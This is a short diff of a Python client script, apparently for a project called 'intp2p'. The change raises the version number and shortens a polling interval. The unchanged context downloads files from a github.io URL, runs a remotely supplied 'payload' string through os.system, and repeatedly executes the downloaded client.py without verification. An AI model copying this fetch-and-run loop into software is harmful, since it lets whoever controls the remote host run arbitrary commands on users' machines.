@@ -6,7 +6,7 @@ url = 'https://renzothemartian.github.io/intp2p/syntax.py'
 r = requests.get(url, allow_redirects=True)
 r2 = requests.get(url2, allow_redirects=True)
 open('syntax.py', 'wb').write(r.content)
-ver = 1.0
+ver = 1.1
 # See if ver is same as ver2 and if not dont run
 if ver != ver2:
     open('client.py', 'wb').write(r2.content)
@@ -15,5 +15,5 @@ import syntax
 os.system(syntax.payload)
 from time import time, sleep
 while True:
-    sleep(5 - time() % 5)
+    sleep(2 - time() % 2)
     os.system("python3 client.py")
